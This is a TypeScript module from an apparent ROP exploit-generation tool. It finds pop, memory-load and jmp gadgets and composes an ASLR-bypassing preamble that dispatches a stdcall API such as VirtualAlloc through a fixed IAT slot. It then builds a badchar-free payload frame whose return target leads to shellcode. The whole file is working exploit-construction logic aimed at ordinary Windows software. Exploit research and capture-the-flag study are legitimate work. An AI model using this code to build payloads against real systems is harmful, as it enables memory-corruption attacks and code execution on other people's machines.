import { CapabilityIndex } from "./capabilities";
import { firstKnownAddress, getStableAddressHint, isAddressStable, retImmBytes, setStableAddressHint } from "./chain";
import { RopGadget } from "./types";
import { FrameWord, WriteFramePlan, planWriteFrame } from "./frame_write";

// ASLR-proof API dispatch through a non-ASLR IAT slot.
//
// When the imported API (e.g. kernel32!VirtualAlloc) is ASLR'd but the module's
// IAT slot that points at it is at a fixed address, we never place the API
// address in the payload. Instead we place a tiny deref preamble as *data* in
// the frame and let it run at pivot time:
//
//   pop <ptr> ; ret         ; ptr = <IAT slot>            (stable module)
//   mov <val>, [<ptr>] ; ret; val = *slot = live API addr
//   jmp <val>               ; dispatch; the fake stdcall frame sits below ESP
//     <retaddr>             ; where the API returns (-> shellcode / jmp esp)
//     <arg1> .. <argN>      ; the stdcall arguments
//
// The deref/dispatch register is NOT assumed to be eax: any register (or a
// two-register split, `mov <val>, [<ptr>]`) is used, ranked by stability. The
// preamble gadget addresses and the slot are badchar-free words; any
// null/badchar-heavy args are synthesised in a register and stored. This is an
// assembler on top of planWriteFrame: it prepends the preamble words and hands
// the whole word list to the write-frame engine.

const REGS = ["eax", "ebx", "ecx", "edx", "esi", "edi", "ebp"];

export interface DerefChain {
  popPtr: RopGadget; // pop <ptrReg> ; ret
  deref: RopGadget; // mov <valReg>, [<ptrReg>] ; ret
  dispatch: RopGadget; // jmp <valReg>
  ptrReg: string;
  valReg: string;
}

export interface SlotDispatchPlan extends WriteFramePlan {
  dispatch: {
    popPtr?: bigint;
    deref?: bigint;
    jmp?: bigint;
    ptrReg?: string;
    valReg?: string;
    slot: number;
    unstable: string[]; // preamble gadgets that are NOT at a stable address
  };
}

function op(g: RopGadget, i: number, n: number): string {
  return (g.instructions[i]?.operands[n] ?? "").trim().toLowerCase();
}

function lastIsRet(g: RopGadget): boolean {
  return g.instructions[g.instructions.length - 1]?.mnemonic === "ret";
}

// Stable module first, then fewest instructions, then lowest ret imm, then score.
// (No ret-imm filter here: `jmp <reg>` has no `ret`; the ret-based finders
// enforce `lastIsRet` themselves.)
function pickBest(cands: RopGadget[]): RopGadget | undefined {
  return [...cands]
    .filter((g) => firstKnownAddress(g) !== undefined)
    .sort((a, b) => {
      const sa = isAddressStable(firstKnownAddress(a)!) ? 0 : 1;
      const sb = isAddressStable(firstKnownAddress(b)!) ? 0 : 1;
      if (sa !== sb) return sa - sb;
      if (a.instructions.length !== b.instructions.length) return a.instructions.length - b.instructions.length;
      if (retImmBytes(a) !== retImmBytes(b)) return retImmBytes(a) - retImmBytes(b);
      return b.score - a.score;
    })[0];
}

// pop <reg> ; ret
function findPop(index: CapabilityIndex, reg: string): RopGadget | undefined {
  return pickBest(index.gadgets.filter((g) =>
    g.instructions.length === 2 && g.instructions[0].mnemonic === "pop" && op(g, 0, 0) === reg && lastIsRet(g)));
}

// mov <valReg>, [<ptrReg>] ; ret
function findMemLoad(index: CapabilityIndex, valReg: string, ptrReg: string): RopGadget | undefined {
  return pickBest(index.gadgets.filter((g) =>
    g.instructions.length === 2 && g.instructions[0].mnemonic === "mov" && lastIsRet(g) &&
    op(g, 0, 0) === valReg && new RegExp(`\\[${ptrReg}\\]$`).test(op(g, 0, 1))));
}

// jmp <reg>
function findJmp(index: CapabilityIndex, reg: string): RopGadget | undefined {
  return pickBest(index.gadgets.filter((g) =>
    g.instructions[0]?.mnemonic === "jmp" && op(g, 0, 0) === reg));
}

function stableCount(chain: DerefChain): number {
  return [chain.popPtr, chain.deref, chain.dispatch]
    .filter((g) => isAddressStable(firstKnownAddress(g)!)).length;
}

// Compose pop <ptr> / mov <val>,[<ptr>] / jmp <val> through ANY register. Prefers
// an all-stable chain, then a single-register self-deref (ptr == val, simplest),
// then fewer total instructions, then score. Returns undefined if no register
// yields a complete chain.
export function findDerefChain(index: CapabilityIndex): DerefChain | undefined {
  const candidates: DerefChain[] = [];
  for (const valReg of REGS) {
    const dispatch = findJmp(index, valReg);
    if (!dispatch) continue;
    for (const ptrReg of REGS) {
      const deref = findMemLoad(index, valReg, ptrReg);
      const popPtr = findPop(index, ptrReg);
      if (deref && popPtr) candidates.push({ popPtr, deref, dispatch, ptrReg, valReg });
    }
  }
  if (candidates.length === 0) return undefined;
  return candidates.sort((a, b) => {
    if (stableCount(a) !== stableCount(b)) return stableCount(b) - stableCount(a);
    const selfA = a.ptrReg === a.valReg ? 0 : 1;
    const selfB = b.ptrReg === b.valReg ? 0 : 1;
    if (selfA !== selfB) return selfA - selfB;
    const insA = a.popPtr.instructions.length + a.deref.instructions.length + a.dispatch.instructions.length;
    const insB = b.popPtr.instructions.length + b.deref.instructions.length + b.dispatch.instructions.length;
    if (insA !== insB) return insA - insB;
    return (b.popPtr.score + b.deref.score + b.dispatch.score) - (a.popPtr.score + a.deref.score + a.dispatch.score);
  })[0];
}

// Which of the deref/dispatch shapes is missing, for an honest failure report.
function missingDerefParts(index: CapabilityIndex): string[] {
  const missing: string[] = [];
  const anyJmp = REGS.some((r) => findJmp(index, r));
  const anyLoad = REGS.some((v) => REGS.some((p) => findMemLoad(index, v, p)));
  if (!anyLoad) missing.push("no `mov <reg>, [<reg>] ; ret` to dereference the IAT slot");
  if (!anyJmp) missing.push("no `jmp <reg>` to dispatch the dereferenced pointer");
  if (anyLoad && anyJmp) {
    // Parts exist individually but not composable through one register pairing.
    missing.push("no register composes pop <ptr> + mov <val>,[<ptr>] + jmp <val> (deref/dispatch registers do not line up)");
  }
  return missing;
}

const FAIL = (unsatisfied: string[]): SlotDispatchPlan => ({
  steps: [],
  unsatisfied,
  gadgets: {},
  placeholders: [],
  stackBytes: 0,
  success: false,
  dispatch: { slot: 0, unstable: [] },
});

/**
 * Plan an ASLR-proof stdcall call through an IAT slot.
 *
 * @param bufAddress writable staging buffer (value or placeholder).
 * @param slot       the non-ASLR IAT slot holding the (ASLR'd) API pointer.
 * @param frame      the fake stdcall frame: index 0 = the API's return target
 *                   (must be executable), index 1.. = the stdcall arguments.
 */
export function planSlotDispatch(
  index: CapabilityIndex,
  bufAddress: { value?: number; placeholder?: string },
  slot: number,
  frame: FrameWord[],
  badchars: number[] = [],
  preferStable?: (address: bigint) => boolean,
): SlotDispatchPlan {
  const prevHint = getStableAddressHint();
  setStableAddressHint(preferStable ?? prevHint);
  try {
    return planSlotDispatchInner(index, bufAddress, slot, frame, badchars, preferStable);
  } finally {
    setStableAddressHint(prevHint);
  }
}

function planSlotDispatchInner(
  index: CapabilityIndex,
  bufAddress: { value?: number; placeholder?: string },
  slot: number,
  frame: FrameWord[],
  badchars: number[],
  preferStable?: (address: bigint) => boolean,
): SlotDispatchPlan {
  const chain = findDerefChain(index);
  const missing: string[] = [];
  if (!chain) missing.push(...missingDerefParts(index));
  if (frame.length === 0) missing.push("no frame words (need at least a return target)");
  if (!chain || missing.length > 0) return FAIL(missing);

  const popAddr = firstKnownAddress(chain.popPtr)!;
  const derefAddr = firstKnownAddress(chain.deref)!;
  const jmpAddr = firstKnownAddress(chain.dispatch)!;

  // The preamble gadget addresses ride in the payload as data, so they must be at
  // stable (non-relocating) addresses. isAddressStable honours the hint set above.
  const unstable: string[] = [];
  if (!isAddressStable(popAddr)) unstable.push(`pop ${chain.ptrReg} @ ${hex(Number(popAddr))}`);
  if (!isAddressStable(derefAddr)) unstable.push(`mov ${chain.valReg},[${chain.ptrReg}] @ ${hex(Number(derefAddr))}`);
  if (!isAddressStable(jmpAddr)) unstable.push(`jmp ${chain.valReg} @ ${hex(Number(jmpAddr))}`);

  // The preamble runs as data words at the head of the frame, then the caller's
  // fake stdcall frame follows (return target, then args).
  const words: FrameWord[] = [
    { value: Number(popAddr) >>> 0, comment: `pop ${chain.ptrReg} ; ret (deref preamble)` },
    { value: slot >>> 0, comment: `IAT slot ${hex(slot)}` },
    { value: Number(derefAddr) >>> 0, comment: `mov ${chain.valReg},[${chain.ptrReg}] ; ret (deref -> live API)` },
    { value: Number(jmpAddr) >>> 0, comment: `jmp ${chain.valReg} (dispatch)` },
    ...frame,
  ];

  const plan = planWriteFrame(index, bufAddress, words, badchars, preferStable);
  return {
    ...plan,
    dispatch: {
      popPtr: popAddr,
      deref: derefAddr,
      jmp: jmpAddr,
      ptrReg: chain.ptrReg,
      valReg: chain.valReg,
      slot: slot >>> 0,
      unstable,
    },
  };
}

function hex(value: number): string {
  return `0x${(value >>> 0).toString(16).toUpperCase().padStart(8, "0")}`;
}
